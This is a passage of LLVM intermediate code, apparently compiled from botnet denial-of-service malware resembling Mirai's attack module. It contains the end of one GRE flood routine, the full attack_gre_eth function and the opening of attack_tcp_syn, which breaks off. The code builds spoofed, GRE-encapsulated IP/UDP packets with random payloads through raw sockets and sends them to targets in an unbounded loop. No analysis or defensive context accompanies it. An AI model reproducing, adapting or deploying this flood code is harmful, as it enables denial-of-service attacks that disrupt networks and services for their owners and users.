  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 2, i32 0
  store i32 %207, i32* %208, align 4
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 1
  store i16 0, i16* %209, align 2
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0
  %211 = bitcast %struct.sockaddr_in* %210 to %struct.sockaddr*
  %212 = call i64 @sendto(i32 %28, i8* nonnull %148, i64 %.pre134, i32 16384, %struct.sockaddr* %211, i32 16) #9
  %213 = load i32, i32* %5, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %5, align 4
  %215 = icmp slt i32 %214, %34
  br i1 %215, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %255
  %storemerge124126 = phi i32 [ %282, %255 ], [ 0, %.lr.ph.split.preheader ]
  %216 = sext i32 %storemerge124126 to i64
  %217 = getelementptr inbounds i8*, i8** %8, i64 %216
  %218 = load i8*, i8** %217, align 8
  %219 = getelementptr inbounds i8, i8* %218, i64 24
  %220 = bitcast i8* %219 to %struct.iphdr*
  %221 = getelementptr inbounds i8, i8* %218, i64 44
  %222 = getelementptr inbounds i8, i8* %218, i64 52
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %216, i32 2
  %224 = load i8, i8* %223, align 4
  %225 = icmp ult i8 %224, 32
  br i1 %225, label %226, label %233

; <label>:226:                                    ; preds = %.lr.ph.split
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %216, i32 1
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @ntohl(i32 %228) #10
  %230 = call i32 @htonl(i32 %229) #10
  %231 = getelementptr inbounds i8, i8* %218, i64 16
  %232 = bitcast i8* %231 to i32*
  store i32 %230, i32* %232, align 4
  br label %233

; <label>:233:                                    ; preds = %.lr.ph.split, %226
  br i1 %96, label %234, label %239

; <label>:234:                                    ; preds = %233
  %235 = getelementptr inbounds i8, i8* %218, i64 4
  %236 = bitcast i8* %235 to i16*
  store i16 0, i16* %236, align 4
  %237 = getelementptr inbounds i8, i8* %218, i64 28
  %238 = bitcast i8* %237 to i16*
  store i16 999, i16* %238, align 4
  br label %239

; <label>:239:                                    ; preds = %234, %233
  br i1 %98, label %240, label %242

; <label>:240:                                    ; preds = %239
  %241 = bitcast i8* %221 to i16*
  store i16 0, i16* %241, align 2
  br label %242

; <label>:242:                                    ; preds = %240, %239
  br i1 %100, label %243, label %246

; <label>:243:                                    ; preds = %242
  %244 = getelementptr inbounds i8, i8* %218, i64 46
  %245 = bitcast i8* %244 to i16*
  store i16 0, i16* %245, align 2
  br label %246

; <label>:246:                                    ; preds = %243, %242
  br i1 %101, label %251, label %247

; <label>:247:                                    ; preds = %246
  %248 = getelementptr inbounds i8, i8* %218, i64 16
  %249 = bitcast i8* %248 to i32*
  %250 = load i32, i32* %249, align 4
  br label %251

; <label>:251:                                    ; preds = %246, %247
  %.sink3 = phi i32 [ %250, %247 ], [ 0, %246 ]
  %252 = getelementptr inbounds i8, i8* %218, i64 40
  %253 = bitcast i8* %252 to i32*
  store i32 %.sink3, i32* %253, align 4
  br i1 %102, label %255, label %254

; <label>:254:                                    ; preds = %251
  call void @rand_str(i8* nonnull %222, i32 %21)
  br label %255

; <label>:255:                                    ; preds = %251, %254
  %256 = getelementptr inbounds i8, i8* %218, i64 10
  %257 = bitcast i8* %256 to i16*
  store i16 0, i16* %257, align 2
  %258 = bitcast i8* %218 to i16*
  %259 = call zeroext i16 @checksum_generic(i16* %258, i32 20) #9
  store i16 %259, i16* %257, align 2
  %260 = getelementptr inbounds i8, i8* %218, i64 34
  %261 = bitcast i8* %260 to i16*
  store i16 0, i16* %261, align 2
  %262 = bitcast i8* %219 to i16*
  %263 = call zeroext i16 @checksum_generic(i16* %262, i32 20) #9
  store i16 %263, i16* %261, align 2
  %264 = getelementptr inbounds i8, i8* %218, i64 50
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  %266 = getelementptr inbounds i8, i8* %218, i64 48
  %267 = bitcast i8* %266 to i16*
  %268 = load i16, i16* %267, align 2
  %269 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %220, i8* nonnull %221, i16 zeroext %268, i32 %103) #9
  store i16 %269, i16* %265, align 2
  %270 = load i32, i32* %5, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 0
  store i16 2, i16* %272, align 4
  %273 = getelementptr inbounds i8, i8* %218, i64 16
  %274 = bitcast i8* %273 to i32*
  %275 = load i32, i32* %274, align 4
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 2, i32 0
  store i32 %275, i32* %276, align 4
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 1
  store i16 0, i16* %277, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0
  %279 = bitcast %struct.sockaddr_in* %278 to %struct.sockaddr*
  %280 = call i64 @sendto(i32 %28, i8* nonnull %218, i64 %.pre134, i32 16384, %struct.sockaddr* %279, i32 16) #9
  %281 = load i32, i32* %5, align 4
  %282 = add nsw i32 %281, 1
  store i32 %282, i32* %5, align 4
  %283 = icmp slt i32 %282, %34
  br i1 %283, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:284:                                    ; preds = %4, %92
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = zext i8 %0 to i64
  %10 = tail call noalias i8* @calloc(i64 %9, i64 8) #9
  %11 = bitcast i8* %10 to i8**
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %19 = trunc i32 %18 to i8
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %26 = trunc i32 %25 to i8
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* @LOCAL_ADDR, align 4
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %29)
  %31 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %305, label %33

; <label>:33:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %34 = bitcast i32* %5 to i8*
  %35 = call i32 @setsockopt(i32 %31, i32 0, i32 3, i8* nonnull %34, i32 4) #9
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %98, label %.preheader132

.preheader132:                                    ; preds = %33
  store i32 0, i32* %5, align 4
  %37 = zext i8 %0 to i32
  %38 = icmp eq i8 %0, 0
  %.pre = sext i32 %24 to i64
  %.pre141 = add nsw i64 %.pre, 66
  br i1 %38, label %.preheader, label %.lr.ph134

.lr.ph134:                                        ; preds = %.preheader132
  %39 = trunc i64 %.pre141 to i16
  %40 = icmp eq i8 %19, 0
  %41 = add nsw i64 %.pre, 28
  %42 = trunc i64 %41 to i16
  %43 = xor i16 %15, -1
  %44 = icmp eq i8 %28, 0
  %45 = add nsw i64 %.pre, 8
  %46 = trunc i64 %45 to i16
  %47 = zext i8 %0 to i64
  br i1 %40, label %.lr.ph134.split.preheader, label %.lr.ph134.split.us.preheader

.lr.ph134.split.us.preheader:                     ; preds = %.lr.ph134
  br label %.lr.ph134.split.us

.lr.ph134.split.preheader:                        ; preds = %.lr.ph134
  br label %.lr.ph134.split

.lr.ph134.split.us:                               ; preds = %.lr.ph134.split.us.preheader, %.lr.ph134.split.us
  %indvars.iv139 = phi i64 [ %indvars.iv.next140, %.lr.ph134.split.us ], [ 0, %.lr.ph134.split.us.preheader ]
  %48 = call noalias i8* @calloc(i64 1510, i64 8) #9
  %49 = getelementptr inbounds i8*, i8** %11, i64 %indvars.iv139
  store i8* %48, i8** %49, align 8
  %50 = getelementptr inbounds i8, i8* %48, i64 38
  %51 = getelementptr inbounds i8, i8* %48, i64 58
  store i8 69, i8* %48, align 4
  %52 = getelementptr inbounds i8, i8* %48, i64 1
  store i8 %13, i8* %52, align 1
  %53 = call zeroext i16 @htons(i16 zeroext %39) #10
  %54 = getelementptr inbounds i8, i8* %48, i64 2
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %15) #10
  %57 = getelementptr inbounds i8, i8* %48, i64 4
  %58 = bitcast i8* %57 to i16*
  store i16 %56, i16* %58, align 4
  %59 = getelementptr inbounds i8, i8* %48, i64 8
  store i8 %17, i8* %59, align 4
  %60 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %61 = getelementptr inbounds i8, i8* %48, i64 6
  %62 = bitcast i8* %61 to i16*
  store i16 %60, i16* %62, align 2
  %63 = getelementptr inbounds i8, i8* %48, i64 9
  store i8 47, i8* %63, align 1
  %64 = getelementptr inbounds i8, i8* %48, i64 12
  %65 = bitcast i8* %64 to i32*
  store i32 %30, i32* %65, align 4
  %66 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv139, i32 1
  %67 = load i32, i32* %66, align 4
  %68 = getelementptr inbounds i8, i8* %48, i64 16
  %69 = bitcast i8* %68 to i32*
  store i32 %67, i32* %69, align 4
  %70 = call zeroext i16 @htons(i16 zeroext 25944) #10
  %71 = getelementptr inbounds i8, i8* %48, i64 22
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext 2048) #10
  %74 = getelementptr inbounds i8, i8* %48, i64 36
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 1
  store i8 69, i8* %50, align 4
  %76 = getelementptr inbounds i8, i8* %48, i64 39
  store i8 %13, i8* %76, align 1
  %77 = call zeroext i16 @htons(i16 zeroext %42) #10
  %78 = getelementptr inbounds i8, i8* %48, i64 40
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %43) #10
  %81 = getelementptr inbounds i8, i8* %48, i64 42
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 4
  %83 = getelementptr inbounds i8, i8* %48, i64 46
  store i8 %17, i8* %83, align 4
  %84 = getelementptr inbounds i8, i8* %48, i64 44
  %85 = bitcast i8* %84 to i16*
  store i16 %60, i16* %85, align 2
  %86 = getelementptr inbounds i8, i8* %48, i64 47
  store i8 17, i8* %86, align 1
  %. = select i1 %44, i32 1023, i32 %67
  %87 = getelementptr inbounds i8, i8* %48, i64 54
  %88 = bitcast i8* %87 to i32*
  store i32 %., i32* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext %21) #10
  %90 = bitcast i8* %51 to i16*
  store i16 %89, i16* %90, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %23) #10
  %92 = getelementptr inbounds i8, i8* %48, i64 60
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %46) #10
  %95 = getelementptr inbounds i8, i8* %48, i64 62
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %indvars.iv.next140 = add nsw i64 %indvars.iv139, 1
  %97 = icmp slt i64 %indvars.iv.next140, %47
  br i1 %97, label %.lr.ph134.split.us, label %..preheader_crit_edge.loopexit149

; <label>:98:                                     ; preds = %33
  %99 = call i32 @close(i32 %31) #9
  br label %305

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph134.split
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit149:                ; preds = %.lr.ph134.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit149, %..preheader_crit_edge.loopexit
  %.lcssa135.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next140, %..preheader_crit_edge.loopexit149 ]
  %.lcssa135 = trunc i64 %.lcssa135.in to i32
  store i32 %.lcssa135, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader132, %..preheader_crit_edge
  %100 = icmp eq i32 %30, -1
  %101 = and i32 %14, 65535
  %102 = icmp eq i32 %101, 65535
  %103 = and i32 %20, 65535
  %104 = icmp eq i32 %103, 65535
  %105 = and i32 %22, 65535
  %106 = icmp eq i32 %105, 65535
  %107 = icmp eq i8 %28, 0
  %108 = bitcast i32* %6 to i8*
  %109 = bitcast i32* %7 to i8*
  %110 = bitcast i32* %8 to i8*
  %111 = getelementptr inbounds i8, i8* %110, i64 2
  %112 = icmp eq i8 %26, 0
  %113 = add i32 %24, 8
  br label %.loopexit

.lr.ph134.split:                                  ; preds = %.lr.ph134.split.preheader, %.lr.ph134.split
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph134.split ], [ 0, %.lr.ph134.split.preheader ]
  %114 = call noalias i8* @calloc(i64 1510, i64 8) #9
  %115 = getelementptr inbounds i8*, i8** %11, i64 %indvars.iv
  store i8* %114, i8** %115, align 8
  %116 = getelementptr inbounds i8, i8* %114, i64 38
  %117 = getelementptr inbounds i8, i8* %114, i64 58
  store i8 69, i8* %114, align 4
  %118 = getelementptr inbounds i8, i8* %114, i64 1
  store i8 %13, i8* %118, align 1
  %119 = call zeroext i16 @htons(i16 zeroext %39) #10
  %120 = getelementptr inbounds i8, i8* %114, i64 2
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %15) #10
  %123 = getelementptr inbounds i8, i8* %114, i64 4
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 4
  %125 = getelementptr inbounds i8, i8* %114, i64 8
  store i8 %17, i8* %125, align 4
  %126 = getelementptr inbounds i8, i8* %114, i64 9
  store i8 47, i8* %126, align 1
  %127 = getelementptr inbounds i8, i8* %114, i64 12
  %128 = bitcast i8* %127 to i32*
  store i32 %30, i32* %128, align 4
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %130 = load i32, i32* %129, align 4
  %131 = getelementptr inbounds i8, i8* %114, i64 16
  %132 = bitcast i8* %131 to i32*
  store i32 %130, i32* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 25944) #10
  %134 = getelementptr inbounds i8, i8* %114, i64 22
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = call zeroext i16 @htons(i16 zeroext 2048) #10
  %137 = getelementptr inbounds i8, i8* %114, i64 36
  %138 = bitcast i8* %137 to i16*
  store i16 %136, i16* %138, align 1
  store i8 69, i8* %116, align 4
  %139 = getelementptr inbounds i8, i8* %114, i64 39
  store i8 %13, i8* %139, align 1
  %140 = call zeroext i16 @htons(i16 zeroext %42) #10
  %141 = getelementptr inbounds i8, i8* %114, i64 40
  %142 = bitcast i8* %141 to i16*
  store i16 %140, i16* %142, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %43) #10
  %144 = getelementptr inbounds i8, i8* %114, i64 42
  %145 = bitcast i8* %144 to i16*
  store i16 %143, i16* %145, align 4
  %146 = getelementptr inbounds i8, i8* %114, i64 46
  store i8 %17, i8* %146, align 4
  %147 = getelementptr inbounds i8, i8* %114, i64 47
  store i8 17, i8* %147, align 1
  %.145 = select i1 %44, i32 1023, i32 %130
  %148 = getelementptr inbounds i8, i8* %114, i64 54
  %149 = bitcast i8* %148 to i32*
  store i32 %.145, i32* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %21) #10
  %151 = bitcast i8* %117 to i16*
  store i16 %150, i16* %151, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %23) #10
  %153 = getelementptr inbounds i8, i8* %114, i64 60
  %154 = bitcast i8* %153 to i16*
  store i16 %152, i16* %154, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %46) #10
  %156 = getelementptr inbounds i8, i8* %114, i64 62
  %157 = bitcast i8* %156 to i16*
  store i16 %155, i16* %157, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %158 = icmp slt i64 %indvars.iv.next, %47
  br i1 %158, label %.lr.ph134.split, label %..preheader_crit_edge.loopexit

.loopexit.loopexit:                               ; preds = %204
  br label %.loopexit.backedge

.loopexit.loopexit148:                            ; preds = %276
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %38, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit148
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %100, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %204
  %storemerge131133.us = phi i32 [ %231, %204 ], [ 0, %.lr.ph.split.us.preheader ]
  %159 = sext i32 %storemerge131133.us to i64
  %160 = getelementptr inbounds i8*, i8** %11, i64 %159
  %161 = load i8*, i8** %160, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 24
  %163 = getelementptr inbounds i8, i8* %161, i64 38
  %164 = bitcast i8* %163 to %struct.iphdr*
  %165 = getelementptr inbounds i8, i8* %161, i64 58
  %166 = getelementptr inbounds i8, i8* %161, i64 66
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 2
  %168 = load i8, i8* %167, align 4
  %169 = icmp ult i8 %168, 32
  br i1 %169, label %170, label %177

; <label>:170:                                    ; preds = %.lr.ph.split.us
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = call i32 @ntohl(i32 %172) #10
  %174 = call i32 @htonl(i32 %173) #10
  %175 = getelementptr inbounds i8, i8* %161, i64 16
  %176 = bitcast i8* %175 to i32*
  store i32 %174, i32* %176, align 4
  br label %177

; <label>:177:                                    ; preds = %.lr.ph.split.us, %170
  %178 = getelementptr inbounds i8, i8* %161, i64 12
  %179 = bitcast i8* %178 to i32*
  store i32 0, i32* %179, align 4
  br i1 %102, label %180, label %185

; <label>:180:                                    ; preds = %177
  %181 = getelementptr inbounds i8, i8* %161, i64 4
  %182 = bitcast i8* %181 to i16*
  store i16 0, i16* %182, align 4
  %183 = getelementptr inbounds i8, i8* %161, i64 42
  %184 = bitcast i8* %183 to i16*
  store i16 999, i16* %184, align 4
  br label %185

; <label>:185:                                    ; preds = %180, %177
  br i1 %104, label %186, label %188

; <label>:186:                                    ; preds = %185
  %187 = bitcast i8* %165 to i16*
  store i16 0, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %186, %185
  br i1 %106, label %189, label %192

; <label>:189:                                    ; preds = %188
  %190 = getelementptr inbounds i8, i8* %161, i64 60
  %191 = bitcast i8* %190 to i16*
  store i16 0, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %189, %188
  br i1 %107, label %197, label %193

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %161, i64 16
  %195 = bitcast i8* %194 to i32*
  %196 = load i32, i32* %195, align 4
  br label %197

; <label>:197:                                    ; preds = %193, %192
  %.sink3.us = phi i32 [ %196, %193 ], [ 0, %192 ]
  %198 = getelementptr inbounds i8, i8* %161, i64 54
  %199 = bitcast i8* %198 to i32*
  store i32 %.sink3.us, i32* %199, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  call void @util_memcpy(i8* nonnull %162, i8* nonnull %108, i32 4) #9
  %200 = getelementptr inbounds i8, i8* %161, i64 30
  call void @util_memcpy(i8* %200, i8* nonnull %109, i32 4) #9
  %201 = getelementptr inbounds i8, i8* %161, i64 28
  call void @util_memcpy(i8* %201, i8* nonnull %110, i32 2) #9
  %202 = getelementptr inbounds i8, i8* %161, i64 34
  call void @util_memcpy(i8* %202, i8* %111, i32 2) #9
  br i1 %112, label %204, label %203

; <label>:203:                                    ; preds = %197
  call void @rand_str(i8* nonnull %166, i32 %24)
  br label %204

; <label>:204:                                    ; preds = %203, %197
  %205 = getelementptr inbounds i8, i8* %161, i64 10
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 2
  %207 = bitcast i8* %161 to i16*
  %208 = call zeroext i16 @checksum_generic(i16* %207, i32 20) #9
  store i16 %208, i16* %206, align 2
  %209 = getelementptr inbounds i8, i8* %161, i64 48
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %163 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20) #9
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %161, i64 64
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 2
  %215 = getelementptr inbounds i8, i8* %161, i64 62
  %216 = bitcast i8* %215 to i16*
  %217 = load i16, i16* %216, align 2
  %218 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %164, i8* nonnull %165, i16 zeroext %217, i32 %113) #9
  store i16 %218, i16* %214, align 2
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0, i32 0
  store i16 2, i16* %221, align 4
  %222 = getelementptr inbounds i8, i8* %161, i64 16
  %223 = bitcast i8* %222 to i32*
  %224 = load i32, i32* %223, align 4
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0, i32 2, i32 0
  store i32 %224, i32* %225, align 4
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0, i32 1
  store i16 0, i16* %226, align 2
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0
  %228 = bitcast %struct.sockaddr_in* %227 to %struct.sockaddr*
  %229 = call i64 @sendto(i32 %31, i8* nonnull %161, i64 %.pre141, i32 16384, %struct.sockaddr* %228, i32 16) #9
  %230 = load i32, i32* %5, align 4
  %231 = add nsw i32 %230, 1
  store i32 %231, i32* %5, align 4
  %232 = icmp slt i32 %231, %37
  br i1 %232, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %276
  %storemerge131133 = phi i32 [ %303, %276 ], [ 0, %.lr.ph.split.preheader ]
  %233 = sext i32 %storemerge131133 to i64
  %234 = getelementptr inbounds i8*, i8** %11, i64 %233
  %235 = load i8*, i8** %234, align 8
  %236 = getelementptr inbounds i8, i8* %235, i64 24
  %237 = getelementptr inbounds i8, i8* %235, i64 38
  %238 = bitcast i8* %237 to %struct.iphdr*
  %239 = getelementptr inbounds i8, i8* %235, i64 58
  %240 = getelementptr inbounds i8, i8* %235, i64 66
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %233, i32 2
  %242 = load i8, i8* %241, align 4
  %243 = icmp ult i8 %242, 32
  br i1 %243, label %244, label %251

; <label>:244:                                    ; preds = %.lr.ph.split
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %233, i32 1
  %246 = load i32, i32* %245, align 4
  %247 = call i32 @ntohl(i32 %246) #10
  %248 = call i32 @htonl(i32 %247) #10
  %249 = getelementptr inbounds i8, i8* %235, i64 16
  %250 = bitcast i8* %249 to i32*
  store i32 %248, i32* %250, align 4
  br label %251

; <label>:251:                                    ; preds = %.lr.ph.split, %244
  br i1 %102, label %252, label %257

; <label>:252:                                    ; preds = %251
  %253 = getelementptr inbounds i8, i8* %235, i64 4
  %254 = bitcast i8* %253 to i16*
  store i16 0, i16* %254, align 4
  %255 = getelementptr inbounds i8, i8* %235, i64 42
  %256 = bitcast i8* %255 to i16*
  store i16 999, i16* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %252, %251
  br i1 %104, label %258, label %260

; <label>:258:                                    ; preds = %257
  %259 = bitcast i8* %239 to i16*
  store i16 0, i16* %259, align 2
  br label %260

; <label>:260:                                    ; preds = %258, %257
  br i1 %106, label %261, label %264

; <label>:261:                                    ; preds = %260
  %262 = getelementptr inbounds i8, i8* %235, i64 60
  %263 = bitcast i8* %262 to i16*
  store i16 0, i16* %263, align 2
  br label %264

; <label>:264:                                    ; preds = %261, %260
  br i1 %107, label %269, label %265

; <label>:265:                                    ; preds = %264
  %266 = getelementptr inbounds i8, i8* %235, i64 16
  %267 = bitcast i8* %266 to i32*
  %268 = load i32, i32* %267, align 4
  br label %269

; <label>:269:                                    ; preds = %264, %265
  %.sink3 = phi i32 [ %268, %265 ], [ 0, %264 ]
  %270 = getelementptr inbounds i8, i8* %235, i64 54
  %271 = bitcast i8* %270 to i32*
  store i32 %.sink3, i32* %271, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  call void @util_memcpy(i8* %236, i8* nonnull %108, i32 4) #9
  %272 = getelementptr inbounds i8, i8* %235, i64 30
  call void @util_memcpy(i8* %272, i8* nonnull %109, i32 4) #9
  %273 = getelementptr inbounds i8, i8* %235, i64 28
  call void @util_memcpy(i8* %273, i8* nonnull %110, i32 2) #9
  %274 = getelementptr inbounds i8, i8* %235, i64 34
  call void @util_memcpy(i8* %274, i8* %111, i32 2) #9
  br i1 %112, label %276, label %275

; <label>:275:                                    ; preds = %269
  call void @rand_str(i8* nonnull %240, i32 %24)
  br label %276

; <label>:276:                                    ; preds = %269, %275
  %277 = getelementptr inbounds i8, i8* %235, i64 10
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 2
  %279 = bitcast i8* %235 to i16*
  %280 = call zeroext i16 @checksum_generic(i16* %279, i32 20) #9
  store i16 %280, i16* %278, align 2
  %281 = getelementptr inbounds i8, i8* %235, i64 48
  %282 = bitcast i8* %281 to i16*
  store i16 0, i16* %282, align 2
  %283 = bitcast i8* %237 to i16*
  %284 = call zeroext i16 @checksum_generic(i16* %283, i32 20) #9
  store i16 %284, i16* %282, align 2
  %285 = getelementptr inbounds i8, i8* %235, i64 64
  %286 = bitcast i8* %285 to i16*
  store i16 0, i16* %286, align 2
  %287 = getelementptr inbounds i8, i8* %235, i64 62
  %288 = bitcast i8* %287 to i16*
  %289 = load i16, i16* %288, align 2
  %290 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %238, i8* nonnull %239, i16 zeroext %289, i32 %113) #9
  store i16 %290, i16* %286, align 2
  %291 = load i32, i32* %5, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0, i32 0
  store i16 2, i16* %293, align 4
  %294 = getelementptr inbounds i8, i8* %235, i64 16
  %295 = bitcast i8* %294 to i32*
  %296 = load i32, i32* %295, align 4
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0, i32 2, i32 0
  store i32 %296, i32* %297, align 4
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0, i32 1
  store i16 0, i16* %298, align 2
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0
  %300 = bitcast %struct.sockaddr_in* %299 to %struct.sockaddr*
  %301 = call i64 @sendto(i32 %31, i8* nonnull %235, i64 %.pre141, i32 16384, %struct.sockaddr* %300, i32 16) #9
  %302 = load i32, i32* %5, align 4
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %5, align 4
  %304 = icmp slt i32 %303, %37
  br i1 %304, label %.lr.ph.split, label %.loopexit.loopexit148

; <label>:305:                                    ; preds = %4, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
